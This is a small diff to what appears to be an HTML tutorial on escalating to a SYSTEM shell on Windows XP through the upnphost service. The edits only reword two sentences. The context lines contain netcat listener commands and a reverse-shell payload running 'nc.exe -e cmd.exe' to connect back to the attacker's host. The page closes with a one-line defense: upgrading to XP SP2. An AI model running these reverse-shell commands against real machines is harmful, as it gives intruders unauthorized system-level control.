@@ -319,12 +319,12 @@ root@pwnux:~# nc -lvnp 4444
 root@pwnux:~# nc -lvnp 4445								
 							</code>
 							<br />
-							<p>Now prepare a payload to send once our connection to the first listener on port 4444 is established. We can simply copy the payload we added in the binary path from our upnphost service, and change the port to the port of our 2nd listener.</p>
+							<p>Next, prepare a payload to send once our connection to the first listener on port 4444 is established. We can simply copy the payload we added in the binary path from our upnphost service, and change the port to the port of our 2nd listener.</p>
 							<code>
 C:\nc.exe -nv 192.168.0.2 4445 -e C:\WINDOWS\System32\cmd.exe							
 							</code>
 							<br />
-							<p>Now we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after about 30 seconds.</p>
+							<p>Finally we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after about 30 seconds.</p>
                             <li><h5>How to protect against this exploit</h5></li>
 							<p>Upgrade to Windows XP SP2 or higher.</p>
                           
